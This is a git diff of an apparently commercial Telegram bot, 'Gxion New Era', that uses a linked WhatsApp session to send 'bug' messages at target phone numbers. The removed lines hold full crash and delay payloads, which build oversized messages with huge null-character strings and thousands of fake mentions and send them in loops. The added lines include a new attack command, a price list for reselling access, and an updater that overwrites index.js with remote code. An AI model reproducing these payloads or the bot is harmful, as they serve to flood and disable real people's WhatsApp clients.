@@ -270,6 +270,7 @@ const chalk = require("chalk");
 const readline = require("readline");
 const path = require("path");
 const ms = require("ms");
+const https = require("https");
 const moment = require("moment-timezone");
 const {
     default: makeWASocket,
@@ -503,7 +504,7 @@ function memory() {
 }
 // ================= SECURITY =================//
 
-const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Unbandfoul/privatedata/refs/heads/main/tokens.json";////ganti jadi Raw luh
+const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Unbandfoul/gxion/refs/heads/main/tokens.json";////ganti jadi Raw luh
 
 
 
@@ -545,10 +546,10 @@ if (!validTokens.length) {
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 » Information:
 ☇ Creator : @Bawzhhh
-☇ Name Script : GXION NEW ERA
-☇ Version : 1.0 
+☇ Name Script : Gxion New Era
+☇ Version : Auto Update
 
-❌ Token tidak terdaftar, Mohon daftarkan token terlebih dahulu
+❌ Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
 `);
   process.exit(1);
 }
@@ -584,10 +585,10 @@ function startBot() {
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 » Information:
 ☇ Creator : @Bawzhhh
-☇ Name Script : GXION NEW ERA
-☇ Version : 1.0
+☇ Name Script : Gxion New Era
+☇ Version : Auto Update
   
-  Bot Berhasil Terhubung Gunakan Script Sebijak Mungkin`))
+  Bot Berhasil Terhubung Gunakan Script Sebrutal Mungkin`))
 }
 
 validateToken()
@@ -620,8 +621,8 @@ const startSesi = async () => {
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 » Information:
 ☇ Creator : @Bawzhhh
-☇ Name Script : GXION NEW ERA
-☇ Version : 1.0
+☇ Name Script : Gxion New Era
+☇ Version : Auto Update
 ☇ Bot Connect
 `);
 
@@ -688,8 +689,8 @@ const startSesi = async () => {
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 » Information:
 ☇ Creator : @Bawzhhh
-☇ Name Script : GXION NEW ERA
-☇ Version : 1.0
+☇ Name Script : Gxion New Era
+☇ Version : Auto Update
 ☇ Bot Connect
 ☇ WhatsApp Number : ${linkedWhatsAppNumber}
 `);
@@ -701,7 +702,7 @@ const startSesi = async () => {
               global.pairingMessage.chatId,
               global.pairingMessage.messageId,
               undefined,
-`<pre>⬡═―⊱「 𝐆𝐗𝐈𝐎𝐍 」⊰―═⬡
+`<pre>⬡═―⊱「 𝑮𝑿𝑰𝑶𝑵 」⊰―═⬡
        
   ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
 ϟ    Number : ${linkedWhatsAppNumber}
@@ -828,7 +829,7 @@ const checkOwner = (ctx, next) => {
   const id = ctx.from.id.toString();
 
   if (!ownerUsers.includes(id)) {
-    return ctx.reply("Owner Access\nContact @pacenicwlee");
+    return ctx.reply("Owner Access\nContact @Bawzhhh");
   }
 
   return next();
@@ -841,7 +842,7 @@ const checkAdmin = (ctx, next) => {
     !adminList.includes(id) &&
     !ownerUsers.includes(id)
   ) {
-    return ctx.reply("❌Admin Access\nContact @Bawzhhh");
+    return ctx.reply("Admin Access\nContact @Bawzhhh");
   }
 
   return next();
@@ -1040,14 +1041,14 @@ function mainKeyboard() {
       { text: "🚀𝐗𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger" }
     ],
     [
-      { text: "🌿𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "primary" }
+      { text: "🎲𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "primary" }
     ],
     [
-      { text: "📢𝐂𝐇𝐀𝐍𝐄𝐋", url: "https://t.me/AboutMybawz", style: "success" },
+      { text: "🌿𝐂𝐇𝐀𝐍𝐄𝐋", url: "https://t.me/AboutMybawz", style: "success" },
       { text: "👑𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", url: "https://t.me/Bawzhhh", style: "danger" }
     ],
     [
-      { text: "📑𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈", callback_data: "info", style: "primary" }
+      { text: "📢𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈", callback_data: "info", style: "primary" }
     ]
   ];
 }
@@ -1057,7 +1058,7 @@ async function editMenu(ctx, caption, keyboard) {
     await ctx.editMessageMedia(
       {
         type: "photo",
-        media: { source: "./image/AtomicCrashers.jpg" }
+        media: { source: "./image/Gxion.jpg" },
         caption: caption,
         parse_mode: "HTML"
       },
@@ -1067,7 +1068,7 @@ async function editMenu(ctx, caption, keyboard) {
     );
   } catch (e) {
     await ctx.replyWithPhoto(
-      { source: "./image/AtomicCrashers.jpg" },
+      { source: "./image/Gxion.jpg" },
       {
         caption,
         parse_mode: "HTML",
@@ -1082,13 +1083,13 @@ async function sendHome(ctx) {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍🦋 』───═⬡
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ Version : 1.0 Murbug Vvip
+◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 𝐔𝐒𝐄𝐑👾 』───═⬡
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
@@ -1110,21 +1111,21 @@ bot.action("xsettings", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍🦋 』───═⬡
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ Version : 1.0 Murbug Vvip
+◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 𝐔𝐒𝐄𝐑👾 』───═⬡
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔💫 』───═⬡
-◇ /connect
-◇ /killsesi
+╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
+
+◇ /update           
 ◇ /addprem
 ◇ /delprem
 ◇ /addadmin
@@ -1156,29 +1157,26 @@ bot.action("xbugs", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍🦋 』───═⬡
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ Version : 1.0 Murbug Vvip
+◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 𝐔𝐒𝐄𝐑👾 』───═⬡
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐁𝐔𝐆𝐒 𝐌𝐄𝐍𝐔🚀 』───═⬡  
-◇ /spamxdelay - Delay invisible 
-◇ /flowerdelay - Delay Hard 1000% 
-◇ /specterdelay - Delay Hard Invisible No Kenon
-
-╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐁𝐔𝐆𝐒 𝐌𝐄𝐍𝐔🏵️ 』───═⬡
-◇ /comboxbug - Combo Bugs
+╭═───⊱『 𝐗𝐁𝐔𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
+          
+◇ /delaySpm
+◇ /attack
 </pre>
 `;
 
-  await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
+  await editMenu(ctx, caption, [[{ text: 🔙"𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
 });
 
 bot.action("tools", async (ctx) => {
@@ -1188,19 +1186,20 @@ bot.action("tools", async (ctx) => {
   const sender = isWhatsAppConnected;   
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍🦋 』───═⬡
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ Version : 1.0 Murbug Vvip
+◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 𝐔𝐒𝐄𝐑👾 』───═⬡
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐓𝐎𝐎𝐋𝐒✨ 』───═⬡
+╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡
+              
 ◇ /brat
 ◇ /tiktokdl
 ◇ /convert
@@ -1228,26 +1227,26 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 1) {
     caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍🦋 』───═⬡
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ Version : 1.0 Murbug Vvip
+◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 𝐔𝐒𝐄𝐑👾 』───═⬡
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓🎉 』───═⬡
-◇  SCRIPT NO UPDATE 20K
-◇  SCRIPT FULL UPADATE 40K
-◇  RESELLER SCRIPT 50K
-◇  PATNER SCRIPT 60K
-◇  MODERATOR SCRIPT 75K
-◇  CEO SCRIPT 90K
-◇  OWNER SCRIPT 110K   
+╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡
+              
+◇40K FULL UP SCRIPT
+◇50K RESELLER SCRIPT
+◇60K PARTNER SCRIPT
+◇75K MODERATOR SCRIPT
+◇90K CEO SCRIPT
+◇110K OWNER SCRIPT
 </pre>
 `;
 
@@ -1264,20 +1263,20 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 2) {
     caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍🦋 』───═⬡
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ Version : 1.0 Murbug Vvip
+◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 𝐔𝐒𝐄𝐑👾 』───═⬡
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
 ╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡
-olaa saya Bawzhhh inggin memberitahu bahwa script ini adalah karya milik saya, saya berterimakasih kalian sudah memakai script bug ini walaupun ampas yakh hehe, titik bahagia seseorang adalah ketika karyanya di gunakan tanpa adanya rasa terpaksa tapi dengan hati yang tulus Terimakasih 
+ olaa saya Bawzhhh ingin memberitahu bahwa script ini adalah karya milik saya, saya berterimakasih kalian sudah memakai script bug ini walaupun ampas yakh hehe, titik bahagia seseorang adalah ketika karyanya di gunakan tanpa adanya rasa terpaksa tapi dengan hati yang tulus Terimakasih 
 </pre>
 `;
 
@@ -1315,6 +1314,78 @@ function getUserId(ctx) {
   if (args.length < 2) return null;
 
   return args[1].replace(/[^0-9]/g, ""); 
+}
+
+bot.action("run_update", async (ctx) => {
+  try {
+    await ctx.answerCbQuery();
+    await doUpdate(ctx);
+  } catch (err) {
+    console.log("UPDATE BUTTON ERROR:", err.message);
+    try {
+      await ctx.answerCbQuery("Gagal menjalankan update");
+    } catch {}
+  }
+});
+
+//------------------(AUTO - UPDATE SYSTEM)--------------------//
+bot.command("update", async (ctx) => doUpdate(ctx));
+
+const UPDATE_URL =
+  "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/index.js";
+
+const thumbnailUp = "https://files.catbox.moe/ub0wh5.jpg";
+
+const UPDATE_FILE_PATH = "./index.js";
+
+function downloadToFile(url, filePath) {
+  return new Promise((resolve, reject) => {
+    const file = fs.createWriteStream(filePath);
+
+    https
+      .get(url, (res) => {
+        if (res.statusCode !== 200) {
+          file.close(() => fs.unlink(filePath, () => {}));
+          return reject(new Error(`HTTP_${res.statusCode}`));
+        }
+
+        res.pipe(file);
+
+        file.on("finish", () => file.close(resolve));
+      })
+      .on("error", (err) => {
+        file.close(() => fs.unlink(filePath, () => {}));
+        reject(err);
+      });
+  });
+}
+
+async function doUpdate(ctx) {
+  if (!isOwner(ctx.from.id)) {
+    return ctx.reply("❌ Khusus owner!");
+  }
+
+  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu...", {
+    parse_mode: "HTML",
+  });
+
+  try {
+    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);
+
+    await ctx.reply(
+      "✅ <b>Update berhasil!</b>\n📄 Ditemukan: <b>index.js</b>\n♻️ <b>Restarting bot...</b>",
+      {
+        parse_mode: "HTML",
+      }
+    );
+
+    setTimeout(() => process.exit(0), 1500);
+  } catch (e) {
+    await ctx.reply(
+      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
+      { parse_mode: "HTML" }
+    );
+  }
 }
 
 /// CASE BUAT OWNER MENU ///
@@ -1798,7 +1869,7 @@ bot.command("ssiphone", async (ctx) => {
     }
 
     await ctx.replyWithPhoto({ source: buffer }, {
-      caption: `✅ Ss Iphone By Gxion ( 🕷️ )`,
+      caption: `✅ Ss Iphone By Gxion Kece ( 🕷️ )`,
       parse_mode: "Markdown"
     });
   } catch (e) {
@@ -1998,15 +2069,15 @@ bot.command("connect", checkOwner, async (ctx) => {
     const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
 
     const msg = await ctx.replyWithPhoto(
-      "https://files.catbox.moe/u7cfjf.jpg",//ganti jadi url catbox gambar lu
+      "https://files.catbox.moe/wmqqm5.jpg",//ganti jadi url catbox gambar lu
       {
         caption:
-`<pre>⬡═―⊱「 ɢxɪᴏɴɴ 」⊰―═⬡
+`<pre>⬡═―⊱「 𝑮𝑿𝑰𝑶𝑵 」⊰―═⬡
        
   ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
 ϟ  Nomor  : ${phoneNumber}
 ϟ  Kode   : ${formattedCode}
-ϟ  Note  : Kalau Gagal Silahkan Hapus Session 
+ϟ  Note  : KALO GAGAL PAIR HAPUS SESSION
 
 ϟ  🟡 Status : Waiting for connection...
 </pre>`,
@@ -2056,17 +2127,17 @@ bot.command("killsesi", checkOwner, async (ctx) => {
   }
 });
 /// ============= CASE BUG 1 SIMPEL=============\\\
-bot.command("spamxdelay", checkAllPremium,checkWhatsAppConnection, async (ctx) => {
+bot.command("delaySpm", checkAllPremium,checkWhatsAppConnection, async (ctx) => {
   try {
     const q = ctx.message.text.split(" ")[1];
-    if (!q) return ctx.reply("🪧 ☇ Example : /spamxdelay 62xx");
+    if (!q) return ctx.reply("🪧 ☇ Example : /delaySpm 62xx");
 
     const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-    await ctx.reply(`✅ SUCCES MENGIRIM BUG TO TARGET: ${q}`);
+    await ctx.reply(`✅ SUCCES MENGIRIM BUG ${q}`);
 
-    for (let r = 0; r < 25; r++) {
-      await InvisDelaySqlVnX(sock, target);
+    for (let i = 0; i < 4; i++) {
+      await XVanitasDelay(sock, target);
       await sleep(1000);
     }
 
@@ -2075,77 +2146,19 @@ bot.command("spamxdelay", checkAllPremium,checkWhatsAppConnection, async (ctx) =
     ctx.reply("❌ Terjadi error");
   }
 });
-///CASE BUG 2///
-bot.command("flowerdelay", checkAllPremium,checkWhatsAppConnection, async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /flowerdelay 62×××`);
-
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
-
-  const processMessage = await ctx.telegram.sendPhoto(
-    ctx.chat.id,
-    { source: "./image/AtomicCrashers.jpg" }, 
-    {
-      caption: `
-<blockquote><pre>𝐆𝐗𝐈𝐎𝐍 𝐀𝐓𝐓𝐀𝐂𝐊𝐒</pre></blockquote>
-⌑ Target : ${q}
-⌑ Type : Delay Hard Invisible Brutal
-⌑ Status : Process`,
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
-        ]]
-      }
-    }
-  );
-
-  const processMessageId = processMessage.message_id;
-
-  for (let i = 0; i < 25; i++) {
-    await BetaDelay(sock, target, false);
-    await sleep(1000);
-    
-    await ArtChaos(sock, target);
-    await sleep(1000);
-    
-    await ArtGold(sock, target);
-    await sleep(2000);
-  }
-
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `
-<blockquote><pre>𝐆𝐗𝐈𝐎𝐍 𝐀𝐓𝐓𝐀𝐂𝐊𝐒</pre></blockquote>
-⌑ Target : ${q}
-⌑ Type : Delay Hard Invisible Brutal
-⌑ Status : Success`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
-        ]]
-      }
-    }
-  );
-});
-/// CASE BUG 3///
-bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+/// CASE BUG 2///
+bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   try {
     const q = ctx.message?.text?.split(" ")[1];
-    if (!q) return ctx.reply("🪧 ☇ Example : /specterdelay 62xx");
+    if (!q) return ctx.reply("🪧 ☇ Example : /Xtest 62xx");
 
     const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
     await ctx.reply(
 `<pre>
-⬡═―━⊱ [ 𝐆𝐗𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 ] ⊰━—═⬡
+⬡═―━⊱ [ GXION ] ⊰━—═⬡
 ⌑ Target : ${q}
-⌑ Type   : Delay Hard 
+⌑ Type   : Xtest
 ⌑ Status : Successful
 ╘═—━━━━━━━━━━━—═⬡</pre>`,
       {
@@ -2153,42 +2166,6 @@ bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx
         reply_markup: {
           inline_keyboard: [
             [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
-          ]
-        }
-      }
-    );
-
-    for (let i = 0; i < 50; i++) {
-      await ArtDunk(sock, target);
-      await sleep(1000);
-      console.log(`🚀 Success Sending Bugs To : ${target}`);
-    }
-
-  } catch (err) {
-    console.log("ERROR:", err.message);
-    ctx.reply("❌ Terjadi error");
-  }
-});
-/// CASE BUG 4///
-bot.command("comboxbug", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
-  try {
-    const q = ctx.message?.text?.split(" ")[1];
-    if (!q) return ctx.reply("🪧 ☇ Example : /comboxbug 62xx");
-
-    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-    await ctx.reply(
-`<pre>
-⬡═―━⊱ [ 𝐆𝐗𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 ] ⊰━—═⬡
-⌑ Target : ${q}
-⌑ Type   : Combox Bugs
-⌑ Status : Successful
-╘═—━━━━━━━━━━━—═⬡</pre>`,
-      {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}`}]
           ]
         }
       }
@@ -2206,312 +2183,6 @@ bot.command("comboxbug", checkAllPremium, checkWhatsAppConnection, async (ctx) =
   }
 });
 // ------------ (  FUNCTION BUGS ) -------------- \\
-async function InvisDelaySqlVnX(sock, target) {
-  while (true) {
-    try {
-     const msgvnx = await generateWAMessageFromContent(
-      target,
-       {
-        groupStatusMessageV2: {
-            message: {     
-         interactiveResponseMessage: {
-           body: {
-             text: "\x10.VnX",
-             format: "DEFAULT"
-           },
-          nativeFlowResponseMessage: {
-           name: "galaxy_message",
-           paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
-           version: 3
-          },
-          contextInfo: {
-            remoteJid: null,
-            statusAttributionType: 2,
-                 statusAttributions: Array.from({ length: 209990 }, (_, z) => ({
-                  type: 1
-                }))  
-              }
-             }
-            }
-          }
-        },
-      { userJid: sock.user.id } 
-    );
-        
-      await sock.relayMessage(
-          target,
-          msgvnx.message,
-           {
-            messageId: msgvnx.key.id,
-            participant: { jid: target }
-           }
-         );
-         console.log(`👻 Vnx SqlLay ke ${target} (Looping Active)`);
-
-         await new Promise(resolve => setTimeout(resolve, 1000));
-
-        } catch (err) {
-            console.error("❌ Error dalam Loop:", err);
-            await new Promise(resolve => setTimeout(resolve, 5000));
-        }
-    }
-}
-
-async function ArtChaos(reyz, target, mention = false) {
-  for (let r = 0; r < 75; r++) {
-    const ArT = generateWAMessageFromContent(
-      target,
-      {
-        groupStatusMessageV2: {
-          message: {
-            interactiveResponseMessage: {
-              contextInfo: {
-                mentionedJid: Array.from({ length: 2000 }, (_, r) => `99999999${r + 1}@s.whatsapp.net`)
-              },
-              body: {
-                text: "ArT - Chaos",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "menu_options",
-                paramsJson: `{"display_text":"${"\u0000".repeat(900000)}","description":"${"\u0000".repeat(90000)}","id":"ArT"}`,
-                version: 3
-              }
-            }
-          }
-        }
-      },
-      { userJid: target }
-    );
-
-    await reyz.relayMessage(
-      target,
-      ArT.message,
-      mention
-        ? { participant: target, messageId: ArT.key.id }
-        : { messageId: ArT.key.id }
-    );
-  }
-}
-
-async function ArtGold(sock, target) {
-  while (Date.now() - Date.now() < 700000) {
-    const ResponseList = {
-      viewOnceMessage: {
-        message: {
-          listResponseMessage: {
-            title: "ArT - Gold",
-            listType: 2,
-            buttonText: null,
-            singleSelectReply: { selectRowId: "🎄" },
-            sections: Array.from({ length: 1999 }, (_, r) => ({
-              title: "ꦽ".repeat(182622),
-              rows: [`{ title: ${r + 1}, id: ${r + 1} }`],
-            })),
-            contextInfo: {
-              participant: target,
-              remoteJid: "status@broadcast",
-              mentionedJid: [
-                "1313224@s.whatsapp.net",
-                ...Array.from({ length: 1999 }, () => "2" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net")
-              ],
-              forwardingScore: 9172,
-              isForwarded: true,
-              forwardedNewsletterMessageInfo: {
-                newsletterJid: "9127162@newsletter",
-                serverMessageId: 1,
-                newsletterName: "ArT - Gold"
-              }
-            },
-            description: "ArT - Gold"
-          }
-        }
-      },
-      contextInfo: {
-        channelMessage: true,
-        statusAttributionType: 2,
-      }
-    };
-
-    await sock.relayMessage("status@broadcast", ResponseList, {
-      statusJidList: [target],
-      additional: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                }
-              ]
-            }
-          ]
-        }
-      ]
-    });
-  }
-}
-
-async function ArtDunk(sock, target) {
-  const ArT1 = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          text: "ArT - Dunk",
-          format: "DEFAULT"
-        },
-        nativeFlowResponseMessage: {
-          name: "galaxy_message",
-          paramsJson: "ꦽ".repeat(172511),
-          version: 3
-        },
-        contextInfo: {
-          participant: target,
-          remoteJid: "status@broadcast",
-          mentionedJid: [
-            "1313224@s.whatsapp.net",
-            ...Array.from({ length: 1999 }, () => "3" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")
-          ]
-        }
-      }
-    }
-  };
-
-  const ArT2 = {
-    viewOnceMessage: {
-      message: {
-        imageMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
-          mimetype: "image/jpeg",
-          fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
-          fileLength: "999999999999999999",
-          height: 9999,
-          width: 9999,
-          mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
-          fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
-          directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1737281900",
-          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
-          scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
-          scanLengths: [3537, 10557, 1905, 2353],
-          midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
-        }
-      }
-    }
-  };
-
-  const ArT3 = {
-    viewOnceMessage: {
-      message: {
-        videoMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-          mimetype: "video/mp4",
-          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-          fileLength: "289511",
-          seconds: 15,
-          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-          caption: "ArT - Dunk" + "𑇂𑆵𑆴𑆿".repeat(120),
-          height: 640,
-          width: 640,
